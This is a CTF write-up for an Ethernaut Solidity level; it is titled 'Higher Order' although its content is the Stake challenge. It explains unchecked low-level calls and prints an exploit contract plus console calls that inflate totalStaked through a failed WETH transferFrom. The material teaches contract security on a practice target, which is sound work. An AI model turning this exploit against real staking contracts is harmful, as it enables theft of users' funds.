# Writeup for Higher Order

- Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you're new to Solidity and haven't deployed a smart contract before, you can learn how to do so using Remix [here](https://youtu.be/3xNFZI8Ste4?si=i3cWN87OpX85zp6k).

### Challenge Description

Stake is safe for staking native ETH and ERC20 WETH, considering the same 1:1 value of the tokens. Can you drain the contract?

To complete this level, the contract state must meet the following conditions:

- The Stake contract's ETH balance has to be greater than 0.
- totalStaked must be greater than the Stake contract's ETH balance.
- You must be a staker.
- Your staked balance must be 0.

### Key Concepts to Learn

In order to exploit this contract we need to understand how low-level call works

In solidity when we use low-level calls the transaction won't fail even if the low-level call fails. It will just return whehter the call is true or false. We need to explicitly write logic to handle edge-cases.

Check the below example.

```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract contract_one{
    mapping(address=>uint256) public balances;

    constructor()payable{
        balances[msg.sender]=1000;
        require(msg.value==1000);
    }


    function withdraw(uint256 amount)public payable{
        if(balances[msg.sender]>=amount){
            balances[msg.sender]-=amount;
            (msg.sender).call{value:amount};
        }
    }


    function deposit()public payable{
        balances[msg.sender]+=msg.value;
    }
}


contract contract_two{
    contract_one public one;

    constructor()payable{
        one=new contract_one{value:1000}(); //Creating contract_two
    }

    function Claim()public{
        one.withdraw(1000);
    }

    function check_balance()public view returns(uint256){
        return one.balances(address(this));
    }
}

```

Deploy `contract_two` by sending 1000 wei during deployment. This will then deploy `contract_one` by sending 1000 wei, and the constructor in `contract_one` will set the balance of `contract_two` to 1000.

Now, calling the `Claim()` function in `contract_two` will call the `withdraw()` function in `contract_one`. The `withdraw()` function in `contract_one` will reduce the balance of `contract_two` and send 1000 wei to `contract_two` using a low-level call.

Since `contract_two` does not have a `receive()` function, it won't accept any ether payments. Therefore, the low-level call made by `contract_one` will fail, but the balances will still be updated. The next time the `Claim()` function in `contract_two` is called, it will revert because the balances have already been updated.

### Contract Explaination

If you understand the contract, you can move on to the [exploit](#exploit) part. If you're a beginner, please read the Contract Explanation to gain a better understanding of Solidity.

Click [here](./src/contracts/Stake.sol) to view the contract source code.

<details>
<summary>Click to view the contract explanation</summary>

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Stake {

    uint256 public totalStaked;
    mapping(address => uint256) public UserStake;
    mapping(address => bool) public Stakers;
    address public WETH;

    constructor(address _weth) payable{
        totalStaked += msg.value;
        WETH = _weth;
    }

    function StakeETH() public payable {
        require(msg.value > 0.001 ether, "Don't be cheap");
        totalStaked += msg.value;
        UserStake[msg.sender] += msg.value;
        Stakers[msg.sender] = true;
    }
    function StakeWETH(uint256 amount) public returns (bool){
        require(amount >  0.001 ether, "Don't be cheap");
        (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));
        require(bytesToUint(allowance) >= amount,"How am I moving the funds honey?");
        totalStaked += amount;
        UserStake[msg.sender] += amount;
        (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));
        Stakers[msg.sender] = true;
        return transfered;
    }

    function Unstake(uint256 amount) public returns (bool){
        require(UserStake[msg.sender] >= amount,"Don't be greedy");
        UserStake[msg.sender] -= amount;
        totalStaked -= amount;
        (bool success, ) = payable(msg.sender).call{value : amount}("");
        return success;
    }
    function bytesToUint(bytes memory data) internal pure returns (uint256) {
        require(data.length >= 32, "Data length must be at least 32 bytes");
        uint256 result;
        assembly {
            result := mload(add(data, 0x20))
        }
        return result;
    }
}
```

The contract has four state variables named `totalStake`, `Userstake`, `Stakers`, and `WETH`. `totalStake` is of type **uint256**, `Userstake` is a mapping of **address** to **uint256**, `Stakers` is a mapping of **address** to bool, and `WETH` is the **address** of an ERC20 instance.

```solidity
constructor(address _weth) payable{
    totalStaked += msg.value;
    WETH = _weth;
}
```

The constructor takes an argument of type **address**, sets `WETH` to the address passed, and sets `totalStaked` to `msg.value`.

```solidity
function StakeETH() public payable {
    require(msg.value > 0.001 ether, "Don't be cheap");
    totalStaked += msg.value;
    UserStake[msg.sender] += msg.value;
    Stakers[msg.sender] = true;
}
```

The function `StakeETH()` checks if `msg.value` is greater than `0.001 ether`. If it is, the function increases `totalStaked` by `msg.value`, updates `UserStake` for `msg.sender` by adding `msg.value`, and sets `Stakers` for `msg.sender` to `true`.

```solidity
function StakeWETH(uint256 amount) public returns (bool){
    require(amount >  0.001 ether, "Don't be cheap");
    (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));
    require(bytesToUint(allowance) >= amount,"How am I moving the funds honey?");
    totalStaked += amount;
    UserStake[msg.sender] += amount;
    (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));
    Stakers[msg.sender] = true;
    return transfered;
}
```

The function `StakeWETH()` takes an argument of type **uint256** and checks if the amount is greater than `0.001 ether`. If it is greater, it checks whether the sender has allowed this contract to transfer `WETH` tokens on behalf of the sender. If the approved amount is greater than the amount passed, it will update the state variables in the same way as the `StakeETH()` function but makes an extra call to the `transferFrom()` function in the WETH contract

```solidity
function Unstake(uint256 amount) public returns (bool){
    require(UserStake[msg.sender] >= amount,"Don't be greedy");
    UserStake[msg.sender] -= amount;
    totalStaked -= amount;
    (bool success, ) = payable(msg.sender).call{value : amount}("");
    return success;
    }
```

The `Unstake()` function takes an argument of type **uint256** as input. It checks if the `msg.sender` (caller) has enough balance to transfer. If they have enough balance, it updates the caller's balance by decreasing `UserStake` of `msg.sender` by the amount passed. Then it makes a low-level call to transfer tokens and returns whether the call was successful or not.

```solidity
function bytesToUint(bytes memory data) internal pure returns (uint256) {
    require(data.length >= 32, "Data length must be at least 32 bytes");
    uint256 result;
    assembly {
        result := mload(add(data, 0x20))
    }
    return result;
}
```

The function `bytesToUint()` takes an argument of type `bytes` as input. It first checks if the data length is 32 bytes. Then, it loads data from memory at the position `data + 0x20` because the position of `data` only contains the length of the data. The actual data is found in the next slot, which is why `0x20` (32 bytes) is added. The value is then loaded into `result` and returned.

</details>

### Exploit

Our goal is to satisfy the four conditions given in the challenge description. Let's satisfy the conditions one by one.

The first condition is to make the contract's `ETH` balance greater than zero. This can be achieved by sending some ether to the contract.

The second condition is to make `totalStaked` greater than the Stake contract's ETH balance. This can be achieved by staking some WETH tokens. We can call the `StakeWETH()` function to stake WETH tokens, but it checks if we have allowed the Stake contract to transfer `WETH` tokens on our behalf before transferring.

Before calling `StakeWETH()`, we need to call the `approve()` function in the WETH contract to allow the Stake contract to transfer tokens on our behalf. When we call `StakeWETH()`, the two `require` statements will pass. Then, `StakeWETH()` calls the `transferFrom` function in the WETH contract, transferring tokens from our address to the Stake contract. However, since we don't have any WETH tokens, the call will fail. Because it is a low-level call, it will return false but still it update's all the state changes, increasing the staked balance of WETH. Once this call cpmpletes then second condition will be satisfied.

The third condition is that we must be a staker, which means we need to deposit some ETH from our EOA (Externally Owned Account). This can be achieved by calling the `StakeETH()` function from the console.

The fourth condition is to make our staked balance zero. This means that whatever we deposited in the previous condition, we need to withdraw so that our staked balance becomes zero. This can be achieved by calling the `Unstake()` function from the console.

Now, all the conditions can be satisfied by the above steps. Below is the Exploit contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IStake{
    function StakeETH() external payable ;
    function StakeWETH(uint256 amount) external returns (bool);
    function Unstake(uint256 amount) external returns (bool);
}

interface IWeth{
    function approve(address spender, uint256 value) external returns (bool);
}

contract ExploitStake{
    IStake stake;
    IWeth weth;
    constructor(address stake_addr,address _weth){
        stake=IStake(stake_addr);
        weth=IWeth(_weth);
    }

    function Exploit()public payable{
        stake.StakeETH{value: 0.0011 ether}();
        weth.approve(address(stake), 1 ether);
        stake.StakeWETH(1 ether);


    }
}
```

Deploy this contract by passing the Stake address and WETH address as arguments to the constructor. Then, call the `Exploit()` function by sending `0.0011 ether` during the call.

Once the `Exploit()` call is done, the first two conditions will be satisfied.

Now, open the console and enter the following:

```javascript
await contract.StakeETH.sendTransaction({ value: 1100000000000000 });
```

```javascript
> await contract.Unstake(1100000000000000)
```

Once you successfully complete the above two calls, the challenge will be solved, and you can submit the instance.

That's it for this challenge hope you enjoyed this challenge.

<p style="text-align:center;">***<strong>Hope you enjoyed this write-up. Keep on hacking and learning!</strong>***</p>
